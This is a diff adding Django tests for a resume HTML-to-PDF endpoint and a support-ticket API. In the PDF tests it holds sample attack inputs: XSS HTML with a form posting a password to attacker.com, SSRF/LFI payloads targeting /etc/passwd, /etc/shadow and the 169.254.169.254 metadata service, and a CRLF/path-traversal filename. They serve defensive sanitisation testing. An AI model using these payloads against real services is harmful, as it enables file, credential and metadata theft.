@@ -1093,3 +1093,657 @@ class SubscriptionDescriptionRawHTMLTestCase(TestCase):
         self.assertEqual(sub.description, new_raw_html)
 
 
+class ResumePDFGenerationTestCase(TestCase):
+    """
+    Comprehensive tests for POST /api/resume/candidates/generate-pdf:
+    1. Multi-parser verification: JSON, Multipart/form-data, Form-urlencoded.
+    2. 415 Unsupported Media Type for unsupported content types.
+    3. Input validation: missing, empty, oversized, invalid HTML -> 400 Bad Request.
+    4. Authentication: 401 Unauthorized for unauthenticated requests.
+    5. XSS Sanitization: strips scripts, event handlers, iframes, objects, forms.
+    6. SSRF / Local File Inclusion (LFI) protection: blocks file://, loopback, private IPs, cloud metadata.
+    7. Legitimate resume rendering: complex CSS, tables, fonts, base64 images -> valid PDF binary.
+    8. Safe filename validation & response headers.
+    """
+
+    def setUp(self):
+        try:
+            cache.clear()
+        except Exception:
+            pass
+        self.client = APIClient()
+
+        # Setup Verified Resume User
+        self.password = "StrongPassword123!"
+        self.user = ResumeRegistration.objects.create(
+            first_name="Alice",
+            last_name="Smith",
+            email="alice.smith@example.com",
+            phone="9876543211",
+            password=make_password(self.password),
+            is_verified=True,
+            status=True,
+        )
+
+    def _get_auth_token(self):
+        refresh = RefreshToken()
+        refresh["user_id"] = self.user.id
+        refresh["id"] = self.user.id
+        refresh["email"] = self.user.email
+        refresh["user_type"] = "resume_user"
+        refresh["first_name"] = self.user.first_name
+        refresh["last_name"] = self.user.last_name
+        return str(refresh.access_token)
+
+    def test_generate_pdf_json_payload_success(self):
+        """Verify POST /api/resume/candidates/generate-pdf with application/json."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        html = """
+        <!DOCTYPE html>
+        <html>
+        <head><title>Resume</title></head>
+        <body>
+            <h1>Alice Smith</h1>
+            <p>Senior Software Engineer</p>
+        </body>
+        </html>
+        """
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": html, "filename": "alice_resume.pdf"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertIn("alice_resume.pdf", response["Content-Disposition"])
+        self.assertTrue(response.content.startswith(b"%PDF"))
+        self.assertGreater(len(response.content), 1000)
+
+    def test_generate_pdf_multipart_form_data_success(self):
+        """Verify POST /api/resume/candidates/generate-pdf with multipart/form-data (fixing 415 error)."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        html = "<html><body><h1>Alice Multipart Resume</h1><p>Experience: 5 years</p></body></html>"
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": html},
+            format="multipart",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertIn("resume.pdf", response["Content-Disposition"])
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_multipart_json_escaped_payload_normalized(self):
+        """Verify multipart/form-data receiving JSON.stringify-escaped HTML is properly normalized."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        # Simulating frontend sending JSON-stringified HTML in form-data
+        raw_html = (
+            "<!DOCTYPE html>\n<html>\n<head>\n"
+            "<style>\n"
+            "@import url(\"https://fonts.googleapis.com/css2?family=Roboto\");\n"
+            "body {\n  margin-bottom: 24px;\n  color: #333;\n}\n"
+            "</style>\n</head>\n"
+            "<body>\n<div style=\"margin-bottom: 24px;\">Alice Escaped Resume</div>\n</body>\n</html>"
+        )
+        import json
+        escaped_html = json.dumps(raw_html)
+
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": escaped_html},
+            format="multipart",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_multipart_escaped_quotes_and_newlines_normalized(self):
+        """Verify multipart/form-data with literal \\n and escaped \\\" in style tags is normalized."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        escaped_html = (
+            "<style>\\n@import url(\\\"https://fonts.googleapis.com/css2?family=Roboto\\\");\\n"
+            "body { margin-bottom: 24px\\\"; }\\n</style>\\n"
+            "<div><p>Alice\\nEngineer</p></div>"
+        )
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": escaped_html},
+            format="multipart",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_form_urlencoded_success(self):
+        """Verify POST /api/resume/candidates/generate-pdf with application/x-www-form-urlencoded."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        html = "<html><body><h1>Alice Form Resume</h1></body></html>"
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": html},
+            format="multipart",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_unsupported_media_type(self):
+        """Verify unsupported Content-Type returns 415 Unsupported Media Type."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data="raw text content",
+            content_type="text/plain",
+        )
+        self.assertEqual(response.status_code, status.HTTP_415_UNSUPPORTED_MEDIA_TYPE)
+
+    def test_generate_pdf_missing_html_returns_400(self):
+        """Verify missing html field returns 400 Bad Request."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"invalid_key": "<html></html>"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+        self.assertTrue("html" in response.data or ("details" in response.data and "html" in response.data["details"]))
+
+    def test_generate_pdf_empty_html_returns_400(self):
+        """Verify empty or too-short html field returns 400 Bad Request."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": "   "},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+        response_short = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": "<p>hi</p>"},
+            format="json",
+        )
+        self.assertEqual(response_short.status_code, status.HTTP_400_BAD_REQUEST)
+
+    def test_generate_pdf_unauthenticated_returns_401(self):
+        """Verify unauthenticated requests return 401 Unauthorized."""
+        self.client.credentials()  # Clear auth
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": "<html><body><h1>Test</h1></body></html>"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
+
+    def test_generate_pdf_xss_and_malicious_tags_sanitized(self):
+        """Verify malicious scripts, event handlers, and iframes are stripped and PDF renders safely."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        malicious_html = """
+        <html>
+        <head>
+            <script>alert('XSS executed'); window.location='http://attacker.com';</script>
+        </head>
+        <body>
+            <h1 onclick="alert('clicked')">Candidate Profile</h1>
+            <img src="http://example.com/pic.jpg" onerror="alert('error')" />
+            <a href="javascript:alert('link')">Click Me</a>
+            <iframe src="http://attacker.com/evil"></iframe>
+            <object data="http://attacker.com/flash"></object>
+            <form action="http://attacker.com/steal"><input name="pass" value="123" /></form>
+        </body>
+        </html>
+        """
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": malicious_html},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_ssrf_and_lfi_blocked(self):
+        """Verify local file inclusion and SSRF targets are intercepted and blocked without error."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        ssrf_html = """
+        <html>
+        <head>
+            <style>
+                @import url('file:///etc/passwd');
+                @font-face {
+                    font-family: 'EvilFont';
+                    src: url('http://169.254.169.254/latest/meta-data/');
+                }
+            </style>
+        </head>
+        <body>
+            <h1>Resume Test</h1>
+            <img src="file:///etc/shadow" />
+            <img src="http://127.0.0.1:8000/admin/" />
+            <img src="http://localhost:3000/internal" />
+            <img src="http://169.254.169.254/secret" />
+            <img src="http://evil-unapproved-domain.com/tracker.png" />
+        </body>
+        </html>
+        """
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": ssrf_html},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertTrue(response.content.startswith(b"%PDF"))
+
+    def test_generate_pdf_complex_styling_and_safe_data_uri(self):
+        """Verify complex resume CSS, print page rules, tables, and valid base64 images render cleanly."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        complex_html = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="utf-8">
+            <style>
+                @page { size: A4; margin: 15mm; }
+                body { font-family: sans-serif; color: #1a1a1a; font-size: 11pt; line-height: 1.4; }
+                .header { border-bottom: 2px solid #2563eb; padding-bottom: 12px; margin-bottom: 15px; }
+                .name { font-size: 24pt; font-weight: bold; color: #1e3a8a; }
+                .contact { font-size: 9pt; color: #4b5563; margin-top: 4px; }
+                .section-title { font-size: 14pt; font-weight: bold; color: #1e3a8a; border-bottom: 1px solid #e5e7eb; padding-bottom: 4px; margin-top: 14px; margin-bottom: 8px; }
+                .exp-item { margin-bottom: 10px; }
+                .exp-title { font-weight: bold; font-size: 11pt; }
+                .exp-company { font-style: italic; color: #374151; font-size: 10pt; }
+                .skills-table { width: 100%; border-collapse: collapse; margin-top: 8px; }
+                .skills-table td { padding: 4px 8px; border: 1px solid #e5e7eb; font-size: 10pt; }
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" width="40" height="40" alt="Avatar" />
+                <div class="name">Alice Smith</div>
+                <div class="contact">alice@example.com &bull; +1 (555) 123-4567 &bull; San Francisco, CA</div>
+            </div>
+            <div class="section-title">Professional Experience</div>
+            <div class="exp-item">
+                <div class="exp-title">Lead Software Architect</div>
+                <div class="exp-company">Tech Solutions Inc. | 2021 - Present</div>
+                <p>Engineered resilient cloud backends handling 50k+ req/sec with Django and PostgreSQL.</p>
+            </div>
+            <div class="section-title">Technical Skills</div>
+            <table class="skills-table">
+                <tr><td><strong>Languages:</strong> Python, TypeScript, Go</td><td><strong>Databases:</strong> PostgreSQL, Redis</td></tr>
+                <tr><td><strong>Frameworks:</strong> Django, React, FastAPI</td><td><strong>Tools:</strong> Docker, Kubernetes, AWS</td></tr>
+            </table>
+        </body>
+        </html>
+        """
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": complex_html, "filename": "Alice_Smith_Resume.pdf"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        self.assertIn("Alice_Smith_Resume.pdf", response["Content-Disposition"])
+        self.assertTrue(response.content.startswith(b"%PDF"))
+        self.assertGreater(len(response.content), 2000)
+
+    def test_generate_pdf_filename_sanitization(self):
+        """Verify filename with path traversal and CRLF characters is safely sanitized."""
+        token = self._get_auth_token()
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        html = "<html><body><h1>Alice Resume</h1></body></html>"
+        response = self.client.post(
+            "/api/resume/candidates/generate-pdf",
+            data={"html": html, "filename": "../../evil\r\nHeader: injected.pdf"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        disposition = response["Content-Disposition"]
+        self.assertNotIn("\r", disposition)
+        self.assertNotIn("\n", disposition)
+        self.assertNotIn("../", disposition)
+
+
+from aryuapp.models import StudentTicket, TicketReply, TicketAttachment, Student
+from django.core.files.uploadedfile import SimpleUploadedFile
+
+
+class ResumeTicketIntegrationTestCase(TestCase):
+    """
+    Comprehensive regression tests for Resume Ticket / Support System integration:
+    - Ticket creation (with & without file attachments)
+    - Authentication and permissions enforcement
+    - Ticket listing with aggregate counts (new, in_progress, closed, total)
+    - Filter by status and ticket_type
+    - Ticket detail retrieval with replies and attachments
+    - Ticket reply and automated state transitions
+    - Protection against replying to closed tickets
+    - Ticket closing action
+    - Strict user data isolation (User A vs User B)
+    - Strict module isolation (Resume tickets vs AryuApp student tickets)
+    """
+
+    def setUp(self):
+        cache.clear()
+        self.client = APIClient()
+
+        # User A (Primary test user)
+        self.user_a = ResumeRegistration.objects.create(
+            first_name="Alice",
+            last_name="Smith",
+            email="alice@example.com",
+            phone="9876543210",
+            password=make_password("TestPass123!"),
+            is_verified=True,
+            status=True,
+        )
+
+        # User B (Isolation test user)
+        self.user_b = ResumeRegistration.objects.create(
+            first_name="Bob",
+            last_name="Jones",
+            email="bob@example.com",
+            phone="9876543211",
+            password=make_password("TestPass123!"),
+            is_verified=True,
+            status=True,
+        )
+
+    def _get_token_for(self, user):
+        refresh = RefreshToken()
+        refresh["user_id"] = user.id
+        refresh["id"] = user.id
+        refresh["email"] = user.email
+        refresh["user_type"] = "resume_user"
+        refresh["first_name"] = user.first_name
+        refresh["last_name"] = user.last_name
+        return str(refresh.access_token)
+
+    def test_unauthenticated_requests_are_rejected(self):
+        """Unauthenticated requests must receive 401 Unauthorized."""
+        response = self.client.get("/api/resume/tickets")
+        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
+
+        response = self.client.post("/api/resume/tickets", data={"subject": "Test", "message": "Help"})
+        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
+
+    def test_create_ticket_success(self):
+        """Authenticated user can create a support ticket."""
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        payload = {
+            "subject": "Need help with PDF download",
+            "message": "My PDF download is timing out on complex template.",
+            "ticket_type": "technical_support",
+            "priority": "High"
+        }
+        response = self.client.post("/api/resume/tickets", data=payload, format="json")
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        self.assertTrue(response.data.get("success"))
+
+        ticket_data = response.data.get("data", {})
+        self.assertEqual(ticket_data.get("subject"), payload["subject"])
+        self.assertEqual(ticket_data.get("message"), payload["message"])
+        self.assertEqual(ticket_data.get("ticket_type"), "technical_support")
+        self.assertEqual(ticket_data.get("status"), "New")
+        self.assertEqual(ticket_data.get("priority"), "High")
+        self.assertTrue(ticket_data.get("ticket_token"))
+
+        # Verify database record
+        ticket_obj = StudentTicket.objects.get(ticket_id=ticket_data["ticket_id"])
+        self.assertEqual(ticket_obj.resume_user, self.user_a)
+        self.assertIsNone(ticket_obj.student)
+        self.assertEqual(ticket_obj.email, self.user_a.email)
+
+    def test_create_ticket_with_file_attachment(self):
+        """Authenticated user can create a ticket with file attachments."""
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        test_file = SimpleUploadedFile("screenshot.png", b"fake_png_data", content_type="image/png")
+        payload = {
+            "subject": "Formatting bug screenshot",
+            "message": "Please see the attached screenshot.",
+            "attachments": test_file,
+        }
+        response = self.client.post("/api/resume/tickets", data=payload, format="multipart")
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+
+        ticket_data = response.data.get("data", {})
+        self.assertEqual(len(ticket_data.get("attachments", [])), 1)
+        self.assertIn("screenshot", ticket_data["attachments"][0]["file"])
+
+    def test_list_tickets_and_status_counts(self):
+        """List tickets returns tickets belonging to user with status aggregates."""
+        # Create tickets in various states for User A
+        t1 = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Ticket 1",
+            message="Msg 1",
+            status="New",
+            ticket_type="support"
+        )
+        t2 = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Ticket 2",
+            message="Msg 2",
+            status="in_progress",
+            ticket_type="billing"
+        )
+        t3 = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Ticket 3",
+            message="Msg 3",
+            status="closed",
+            ticket_type="support"
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.get("/api/resume/tickets")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertTrue(response.data.get("success"))
+
+        counts = response.data.get("counts", {})
+        self.assertEqual(counts.get("new"), 1)
+        self.assertEqual(counts.get("in_progress"), 1)
+        self.assertEqual(counts.get("closed"), 1)
+        self.assertEqual(counts.get("total"), 3)
+
+        tickets = response.data.get("tickets", [])
+        self.assertEqual(len(tickets), 3)
+
+    def test_list_tickets_filtering(self):
+        """Filtering by status and ticket_type works correctly."""
+        StudentTicket.objects.create(
+            resume_user=self.user_a, subject="T1", message="M1", status="New", ticket_type="support"
+        )
+        StudentTicket.objects.create(
+            resume_user=self.user_a, subject="T2", message="M2", status="in_progress", ticket_type="billing"
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        # Filter by status
+        response = self.client.get("/api/resume/tickets?status=in_progress")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(response.data["tickets"]), 1)
+        self.assertEqual(response.data["tickets"][0]["status"], "in_progress")
+
+        # Filter by ticket_type
+        response = self.client.get("/api/resume/tickets?ticket_type=billing")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(response.data["tickets"]), 1)
+        self.assertEqual(response.data["tickets"][0]["ticket_type"], "billing")
+
+    def test_retrieve_ticket_detail(self):
+        """Retrieve single ticket with chronological replies and attachments."""
+        ticket = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Detailed Ticket",
+            message="Initial ticket description.",
+            status="New"
+        )
+        reply = TicketReply.objects.create(
+            ticket=ticket,
+            resume_user=self.user_a,
+            message="Here is additional information."
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.get(f"/api/resume/tickets/{ticket.ticket_id}")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        data = response.data.get("data", {})
+        self.assertEqual(data.get("ticket_id"), ticket.ticket_id)
+        self.assertEqual(len(data.get("replies", [])), 1)
+        self.assertEqual(data["replies"][0]["sender_type"], "resume_user")
+        self.assertEqual(data["replies"][0]["message"], "Here is additional information.")
+
+    def test_reply_to_ticket(self):
+        """User can submit a reply, transitioning status to in_progress."""
+        ticket = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Question about plan",
+            message="How do I upgrade?",
+            status="New"
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(
+            f"/api/resume/tickets/{ticket.ticket_id}/reply",
+            data={"message": "Any updates on my upgrade request?"},
+            format="json"
+        )
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        self.assertTrue(response.data.get("success"))
+
+        ticket.refresh_from_db()
+        self.assertEqual(ticket.status, "in_progress")
+        self.assertEqual(ticket.replies.count(), 1)
+        self.assertEqual(ticket.replies.first().resume_user, self.user_a)
+
+    def test_reply_to_closed_ticket_fails(self):
+        """Cannot reply to a closed ticket."""
+        ticket = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Old ticket",
+            message="Already resolved.",
+            status="closed"
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(
+            f"/api/resume/tickets/{ticket.ticket_id}/reply",
+            data={"message": "Trying to reply to closed ticket"},
+            format="json"
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+        self.assertFalse(response.data.get("success"))
+
+    def test_close_ticket(self):
+        """User can explicitly close an active ticket."""
+        ticket = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Ticket to close",
+            message="Please close this.",
+            status="in_progress"
+        )
+
+        token = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
+
+        response = self.client.post(f"/api/resume/tickets/{ticket.ticket_id}/close")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertTrue(response.data.get("success"))
+
+        ticket.refresh_from_db()
+        self.assertEqual(ticket.status, "closed")
+
+    def test_strict_user_isolation(self):
+        """User B cannot access or modify User A's tickets."""
+        ticket_a = StudentTicket.objects.create(
+            resume_user=self.user_a,
+            subject="Alice Confidential Issue",
+            message="Private details.",
+            status="New"
+        )
+
+        token_b = self._get_token_for(self.user_b)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token_b}")
+
+        # 1. User B list must be empty
+        response = self.client.get("/api/resume/tickets")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(len(response.data["tickets"]), 0)
+        self.assertEqual(response.data["counts"]["total"], 0)
+
+        # 2. User B cannot retrieve User A's ticket
+        response = self.client.get(f"/api/resume/tickets/{ticket_a.ticket_id}")
+        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
+
+        # 3. User B cannot reply to User A's ticket
+        response = self.client.post(
+            f"/api/resume/tickets/{ticket_a.ticket_id}/reply",
+            data={"message": "Unauthorized reply attempt"},
+            format="json"
+        )
+        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
+
+        # 4. User B cannot close User A's ticket
+        response = self.client.post(f"/api/resume/tickets/{ticket_a.ticket_id}/close")
+        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
+
+    def test_module_isolation_aryuapp_vs_resume(self):
+        """AryuApp LMS tickets are isolated and never returned in Resume ticket endpoints."""
+        student_ticket = StudentTicket.objects.create(
+            student=None, # e.g. AryuApp student or anonymous
+            resume_user=None,
+            subject="AryuApp LMS Course Issue",
+            message="Python LMS course issue",
+            status="New"
+        )
+
+        token_a = self._get_token_for(self.user_a)
+        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token_a}")
+
+        # List must not include AryuApp ticket
+        response = self.client.get("/api/resume/tickets")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        ticket_ids = [t["ticket_id"] for t in response.data["tickets"]]
+        self.assertNotIn(student_ticket.ticket_id, ticket_ids)
+
+        # Retrieve must return 404
+        response = self.client.get(f"/api/resume/tickets/{student_ticket.ticket_id}")
+        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
+
